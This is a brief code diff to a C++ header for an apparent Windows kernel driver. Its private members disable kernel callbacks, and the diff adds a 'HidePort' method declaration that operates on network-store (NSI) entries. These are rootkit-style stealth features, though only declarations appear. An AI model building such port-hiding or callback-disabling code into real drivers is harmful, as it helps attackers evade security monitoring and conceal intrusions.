@@ -118,6 +118,8 @@ private:
 	NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
 	NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
 	NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
+	void HidePort(PVOID entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
+		PNSI_PROCESS_ENTRY processEntries, SIZE_T index);
 
 public:
 	void* operator new(size_t size) {
